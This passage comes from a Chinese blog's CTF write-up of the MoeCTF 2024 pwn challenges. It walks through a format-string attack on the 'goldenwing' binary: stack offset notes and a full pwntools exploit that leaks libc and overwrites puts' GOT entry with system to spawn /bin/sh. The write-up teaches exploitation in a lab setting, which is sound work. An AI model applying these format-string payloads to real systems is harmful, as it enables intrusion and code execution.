+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>stack1_addr = stack2_addr - <span class="hljs-number">0</span>x20<br>stack3_addr = stack1_addr + <span class="hljs-number">8</span><br>offset = stack3_addr&amp;<span class="hljs-number">0</span>xff<br>offset2 = <span class="hljs-number">0</span>x1158e-offset<br>payload = <span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">6</span>+<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(offset-<span class="hljs-number">6</span>)+<span class="hljs-string">&#x27;c%hhn&#x27;</span>+<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(offset2)+<span class="hljs-string">&#x27;c%12$hn&#x27;</span><br><span class="hljs-function"><span class="hljs-title">sd</span><span class="hljs-params">(payload)</span></span><br><br></code></pre></td></tr></table></figure>
+
+<p>从上至下：</p>
+<p>stack1,stack3,stack2,stack4</p>
+<p>8           9          12          13</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031635572.png" srcset="/img/loading.gif" lazyload alt="image-20241003163536515"></p>
+<p>由于leave_ret一次后rbp链会变化，即使从push开始也是。。</p>
+<p>那，，直接回fight开始呢，试一试。可以，但是如果想要改got的话，总是动返回地址会很麻烦，刚好也有另一条三连的链，用那个更好用。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031704505.png" srcset="/img/loading.gif" lazyload alt="image-20241003170415436"></p>
+<p>这里magic2之后才输入，但是总是接收不到，get到一个小技巧，用interactive来截断。由于4字节输入太大了会崩掉，那就分批输入。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031844858.png" srcset="/img/loading.gif" lazyload alt="image-20241003184425810"></p>
+<p>那么可以考虑分字节输入puts的got表里，但是重复的时候也会执行puts函数，不能重调后再使用这条链，所以还是需要用到下面的三连链。。。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410031906999.png" srcset="/img/loading.gif" lazyload alt="image-20241003190645941"></p>
+<p>从上到下：7、5、6</p>
+<p>stack5_addr:0x26+6&#x3D;44</p>
+<p>stack6_addr:0x35+6&#x3D;59</p>
+<p>stack7_addr:0x19+6&#x3D;31</p>
+<p>辛辛苦苦改成system之后，发现会卡死。。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410032019428.png" srcset="/img/loading.gif" lazyload alt="image-20241003201954347"></p>
+<p>因为改动过rbp的指向，导致不能正常回退，那就改成用read,再手调到偏转到god。</p>
+<p>不对，最后一次的多次更改可以再加一个，把返回地址跳转走就好</p>
+<p>这里手动修复过去，但是忘了最先开始是啥了，调一下看看。。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410032031341.png" srcset="/img/loading.gif" lazyload alt="image-20241003203125263"></p>
+<p>找到了</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410032033229.png" srcset="/img/loading.gif" lazyload alt="image-20241003203317184"></p>
+<p>不能直接回到这里，这是回去后的第一个puts，要去第二个。（其实是别的问题，回到system参数错误也是没问题的）</p>
+<p>否则：</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410032039258.png" srcset="/img/loading.gif" lazyload alt="image-20241003203909206"></p>
+<p>由于rbp动歪了，导致&#x2F;bin&#x2F;sh字符串偏离了。。。</p>
+<p>尝试改read，跳转，但是还是歪了。。</p>
+<p>还是用puts改吧，至少不会因此中断程序，但是，，puts改为system后，不方便调试，每次一到对应的地方就卡断了。。</p>
+<p>不过既然可以跳转回来再运行success，可以在这里纠正一次got。。</p>
+<p>纠正完之后，终于本地通了。。。。。</p>
+<p><img src="https://raw.githubusercontent.com/xyyr-c/picture-for-md/main/img/202410032144974.png" srcset="/img/loading.gif" lazyload alt="image-20241003214454907"></p>
+<p>折磨死算了。</p>
+<p>exp:</p>
+<figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs leaf">from pwn import*<br>context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">p</span>=process(&#x27;./goldenwing&#x27;)<br>p=remote(&#x27;127.0.0.1&#x27;,33395)<br>sl = lambda s :p.sendline(s)<br>sd = lambda s :p.send(s)<br>rc = lambda s :p.recv(s)<br>ru = lambda s :p.recvuntil(s)<br>rl = lambda   :p.recvline()<br><br>def debug():<br>    gdb.attach(p)<br>    pause(1)<br>puts_got = 0x4020+0x10000<br>magic_addr = 0x401564<br>sd(b&#x27;\n&#x27;)<br>ru(&#x27;?&#x27;)<br>sl(&#x27;3405691582&#x27;)<br>rl()<br>sd(&#x27;/bin/sh\x00\x00&#x27;)<br><br>ru(&#x27;?&#x27;)<br>sl(&#x27;2&#x27;)<br>rl()<br>sl(&#x27;-100000&#x27;)<br>rl()<br>sl(&#x27;-100000&#x27;)<br>ru(&#x27;?&#x27;)<br>sl(&#x27;3&#x27;)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br><br>payload = &#x27;%43$p&#x27;<br>payload = payload.ljust(8,&#x27;a&#x27;)<br>payload += &#x27;%8$p&#x27;<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>sd(payload)<br>ru(&#x27;0x&#x27;)<br><br>libc_main = int(rc(12),16)<br>offset = 0x7fa3b1e29e40 -  0x7fa3b1e00000<br>libc_base = libc_main-offset<br>print(hex(libc_base))<br><br>ru(&#x27;aaa&#x27;)<br>stack2_addr = int(rc(14),16)<br>print(hex(stack2_addr))<br><br>stack1_addr = stack2_addr - 0x20<br>stack3_addr = stack1_addr + 8<br>stack4_addr = stack2_addr + 8<br><br>stack5_addr = stack1_addr - 0x10 + 0x130<br>stack6_addr = stack1_addr - 0x10 + 0x198<br>stack7_addr = stack1_addr - 0x10 + 0xc8<br>rbp_true = stack1_addr + 0x70<br>def magic(flag=1):<br>    if flag==1:<br>        offset = stack3_addr&amp;0xffff<br>        offset2 = 0x11632-offset<br>        payload = &#x27;%c&#x27;*6+&#x27;%&#x27;+str(offset-6)+&#x27;c%hn&#x27;+&#x27;%&#x27;+str(offset2)+&#x27;c%12$hn\x00&#x27;<br>        sd(payload)<br>    if flag==2:<br>        offset = stack3_addr&amp;0xffff<br>        offset2 = 0x11632-offset<br>        offset3 = (stack7_addr&amp;0xffff)+0x10000-0x1632<br>        payload = &#x27;%c&#x27;*6+&#x27;%&#x27;+str(offset-6)+&#x27;c%hn&#x27;+&#x27;%&#x27;+str(offset2)+&#x27;c%12$hn&#x27;+&#x27;%&#x27;+str(offset3)+&#x27;c%44$hn\x00&#x27;<br>        print(payload)<br>        print(hex(offset3))<br>        print(hex(stack7_addr))<br>        <span class="hljs-punctuation">#</span><span class="hljs-keyword">pause</span><span class="hljs-params">()</span><br>        sd(payload)<br>    if flag==3:<br>        offset = stack3_addr&amp;0xffff<br>        offset2 = 0x11632-offset<br>        offset3 = puts_got-0x1632+2<br>        payload = &#x27;%c&#x27;*6+&#x27;%&#x27;+str(offset-6)+&#x27;c%hn&#x27;+&#x27;%&#x27;+str(offset2)+&#x27;c%12$hn&#x27;+&#x27;%&#x27;+str(offset3)+&#x27;c%59$hn\x00&#x27;<br>        sd(payload)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>magic(2)<br><br>libc = ELF(&#x27;./libc.so.6&#x27;)<br>system_offset = libc.sym[&#x27;system&#x27;]<br>puts_offset = libc.sym[&#x27;puts&#x27;]<br>system_addr = libc_base + system_offset<br>pop_rdi = 0x000000000002a3e5 + libc_base<br>system_12 = system_addr&amp;0xffff<br>system_3 = system_addr&gt;&gt;16&amp;0xff<br><br>print(hex(system_addr))<br>print(hex(system_12))<br>print(hex(system_3))<br><br>def puts_system(puts_got):<br>    offset = stack4_addr &amp;0xffff<br>    offset2 = puts_got - offset<br>    payload = &#x27;%c&#x27;*6+&#x27;%&#x27;+str(offset-6)+&#x27;c%hn&#x27;+&#x27;%&#x27;+str(offset2)+&#x27;c%12$hn\x00&#x27;<br>    sd(payload)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">ru</span><span class="hljs-params">(&#x27;<span class="hljs-variable">magic2</span>&#x27;)</span><br><br>p.interactive()<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>sl(&#x27;aaaa&#x27;)<br>magic(3)<br>sleep(1)<br>p.interactive()<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>sleep(1)<br>puts_system(puts_got)<br>offset = system_12-system_3<br>offset_ok = 0x17bb - system_12<br><br>p.interactive()<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">debug</span><span class="hljs-params">()</span><br>payload = &#x27;%&#x27;+str(system_3)+&#x27;c%31$hhn&#x27;+&#x27;%&#x27;+str(offset)+&#x27;c%13$hn&#x27;+ &#x27;%&#x27; + str(offset_ok) + &#x27;c%12$hn\x00&#x27;<br>print(hex(system_addr))<br>print(hex(system_12))<br>print(hex(system_3))<br>print(hex(offset))<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">pause</span><span class="hljs-params">()</span><br>sleep(1)<br>sd(payload)<br><span class="hljs-punctuation">#</span><span class="hljs-keyword">rl</span><span class="hljs-params">()</span><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">sl</span><span class="hljs-params">(&#x27;3405691582&#x27;)</span><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">sd</span><span class="hljs-params">(&#x27;<span class="hljs-operator">/</span><span class="hljs-variable">bin</span><span class="hljs-operator">/</span><span class="hljs-variable">sh</span>\<span class="hljs-variable">x00</span>&#x27;)</span><br><span class="hljs-punctuation">#</span><span class="hljs-keyword">rl</span><span class="hljs-params">()</span><br>p.interactive()<br><br>sl(&#x27;3&#x27;)<br>offset_fi = rbp_true&amp;0xffff<br>payload = &#x27;%&#x27;+str(offset_fi)+&#x27;c%8$hn&#x27;<br>p.interactive()<br>sd(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<p>由于次数太多了，本地可以通，远程很难通过，跑着跑着在最后一步就崩掉了。经过崩掉了n次后，可算通了。。。</p>
+<h4 id="27-luosh"><a href="#27-luosh" class="headerlink" title="27 luosh"></a>27 luosh</h4><p>看不懂一点，没思路，结束。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>https://xyyr-c.github.io/2024/10/23/moe2024新生赛--pwn篇/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>xyyr</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年10月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/10/23/%E7%BE%8A%E5%9F%8E%E6%9D%AF--heap%E5%A4%8D%E7%8E%B0/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"https://twikoo-6gxh6ogsm-xyyrs-projects.vercel.app/","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              Fluid.utils.listenDOMLoaded(function() {
+                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+                Fluid.plugins.imageCaption(imgSelector);
+                Fluid.plugins.fancyBox(imgSelector);
+              });
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
